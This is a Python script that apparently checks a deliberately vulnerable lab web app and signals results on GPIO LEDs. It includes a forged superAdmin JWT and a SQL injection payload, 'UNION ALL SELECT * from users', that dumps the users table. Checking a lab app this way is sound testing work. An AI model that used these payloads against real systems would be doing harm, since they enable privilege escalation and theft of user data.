# -*- coding: utf-8 -*-
import requests
import subprocess
import time


PORT = 11000
host = '0.0.0.0'

loginurl = 'http://0.0.0.0:11000/login'
logouturl ='http://0.0.0.0:11000/logout'
registrationurl = 'http://0.0.0.0:11000/registration'
profileurl = 'http://0.0.0.0:11000/profile'
tasksurl = 'http://0.0.0.0:11000/tasks'
onlineurl = 'http://0.0.0.0:11000/online'
mainurl = 'http://0.0.0.0:11000/'
i = 0

def init():
	subprocess.run(["gpio export 6 out"], shell=True)
	subprocess.run(["gpio export 7 out"], shell=True)
	subprocess.run(["gpio export 8 out"], shell=True)
	subprocess.run(["gpio export 9 out"], shell=True)


def ping():
	try:
		r = requests.get(mainurl, timeout=3)
		r1 = requests.get(logouturl, timeout=3)
		r2 = requests.get(registrationurl, timeout=3)
		r3 = requests.get(loginurl, timeout=3)
		r4 = requests.get(onlineurl, timeout=3)
		r5 = requests.get(tasksurl, timeout=3)
		r6 = requests.get(profileurl, timeout=3)

	    #Get-запрос на /чек выдает 500, если флаг не найден в локальной таблице
	    #r8 = requests.get(f'http://{self.checker.host}:{PORT}/checker', timeout=3)
	    
		subprocess.run(["echo 1 > /sys/class/gpio/gpio6/value"], shell=True)
		
		if not "200" in str(r):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
		elif not "200" in str(r1):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
		elif  not "200" in str(r2):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
		elif not "200" in str(r3):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
		elif not "200" in str(r4):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
		elif not "200" in str(r5):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
		elif not "200" in str(r6):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
		else:
			subprocess.run(["echo 1 > /sys/class/gpio/gpio6/value"], shell=True)
	except Exception as e:
		print(e)		
		i=0
		while(i<4):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio6/value"], shell=True)
			time.sleep(10)
			subprocess.run(["echo 1 > /sys/class/gpio/gpio6/value"], shell=True)
			i+=1
		

def check():
	try:
		subprocess.run(["echo 1 > /sys/class/gpio/gpio7/value"], shell=True)

		r = requests.post(loginurl, data = {'username': 'user', 'password' : 'password'}, timeout = 50)
		dict_cookies = r.cookies.get_dict()
		dict_cookies["jwt"] = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6W1syXV0sInVzZXIiOiJ1c2VyIiwicGFzc3dvcmQiOiJwYXNzd29yZCIsInJvbGUiOiJzdXBlckFkbWluIn0.A5art41ChmL_u1nS6YcIl9xumM-6d49iIwuTeITzwUI"
		r = requests.get(profileurl, cookies=dict_cookies, data = "")
		if "<li>Текущая роль - superAdmin</li>" in r.text:
			None
		else:
			subprocess.run(["echo 0 > /sys/class/gpio/gpio7/value"], shell=True)
	except Exception as e:
		print(e)		
		i=0
		while(i <4):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio7/value"], shell=True)
			time.sleep(10)
			subprocess.run(["echo 1 > /sys/class/gpio/gpio7/value"], shell=True)
			i+=1

def check_sqlinj():
	try:
		subprocess.run(["echo 1 > /sys/class/gpio/gpio8/value"], shell=True)

		r = requests.post(loginurl, data = {'username': 'user', 'password' : 'password'}, timeout = 50)
		dict_cookies = r.cookies.get_dict()
		r = requests.post(tasksurl, cookies=dict_cookies, data = 
		{'action':'Посмотреть задачи','taskAuthorInput':'1\' UNION ALL SELECT * from users;--'})
		if "HelloIAmAdmin" in r.text:
			None
		else:
			subprocess.run(["echo 0 > /sys/class/gpio/gpio8/value"], shell=True)
	except Exception as e:
		print(e)
		i=0
		while(i <4):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio8/value"], shell=True)
			time.sleep(10)
			subprocess.run(["echo 1 > /sys/class/gpio/gpio8/value"], shell=True)
			i+=1
    
def check_online():
	try:
		subprocess.run(["echo 1 > /sys/class/gpio/gpio9/value"], shell=True)
		r = requests.get(onlineurl, cookies = {}, data = "")
		if "<li>Добро пожаловать: []</li>" in r.text:
			None
		else:
			subprocess.run(["echo 0 > /sys/class/gpio/gpio9/value"], shell=True)
	except Exception as e:
		print(e)		
		i=0
		while(i<4):
			subprocess.run(["echo 0 > /sys/class/gpio/gpio9/value"], shell=True)
			time.sleep(10)
			subprocess.run(["echo 1 > /sys/class/gpio/gpio9/value"], shell=True)
			i+=1

if __name__ == '__main__':
	init()
	ping()
	check()
	check_sqlinj()
	check_online()
